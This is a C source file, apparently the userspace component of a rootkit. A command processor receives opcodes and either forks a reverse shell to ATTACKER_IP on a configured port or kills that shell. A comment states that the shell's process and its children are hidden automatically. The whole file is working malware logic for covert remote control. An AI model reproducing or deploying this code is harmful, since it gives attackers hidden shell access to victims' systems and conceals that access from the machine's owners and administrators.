#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>

#include "config.h"
#include "userspace/command_processor.h"
#include "userspace/reverse_shell.h"

/**
 * @brief Spawn a reverse shell.
 *
 * PID of the reverse shell will automatically be hidden
 * together with every child process of it.
 *
 * @param process_ctx
 * @return int
 */
static int spawn_reverse_shell(process_context_t *process_ctx) {
    pid_t pid = fork();
    if (pid < 0) {
        int err = errno;
        return -err;
    }

    if (pid == 0)
        reverse_shell_start(ATTACKER_IP, REVERSE_SHELL_PORT);

    process_ctx->reverse_shell_pid = pid;

    return 0;
}

int command_processor_handle_received_command(void *ctx, void *data, size_t data_sz) {
    (void)ctx;
    (void)data_sz;

    process_context_t *process_ctx = (process_context_t *)ctx;

    event_t *event = (event_t *)data;

    switch (event->command_opcode) {
    case COMMAND_REVERSE_SHELL_START:
        if (process_ctx->reverse_shell_pid == -1)
            spawn_reverse_shell(process_ctx);
        break;
    case COMMAND_REVERSE_SHELL_STOP:
        if (process_ctx->reverse_shell_pid > 0) {
            kill(process_ctx->reverse_shell_pid, SIGTERM);
            process_ctx->reverse_shell_pid = -1;
        }
        break;
    default:
        break;
    }

    return 0;
}
